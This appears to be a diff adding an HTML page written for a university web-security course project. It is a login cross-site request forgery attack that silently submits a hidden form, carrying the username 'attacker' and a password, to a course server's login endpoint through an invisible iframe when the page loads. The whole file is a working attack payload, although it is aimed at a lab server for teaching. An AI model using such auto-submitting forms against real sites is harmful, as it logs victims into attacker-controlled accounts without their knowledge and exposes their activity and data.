@@ -1,0 +1,16 @@
+<!-- Nicholas Mauro (nmauro@bu.edu) U06257749 -->
+<html>
+    <body>
+        <form action="http://cs558web.bu.edu/project2/login" method="post" target="myframe" name="blank">
+            <input name="csrfdefense" value="0" type="hidden">
+            <input name="xssdefense" value="4" type="hidden">
+            <input name="username" value="attacker" type="hidden">
+            <input name="password" value="l33th4x" type="hidden">
+        </form>
+        <iframe name="myframe" width="0" height="0" style="display:none">
+        </iframe>
+        <script>
+            document.blank.submit();
+        </script>
+    </body>
+</html>
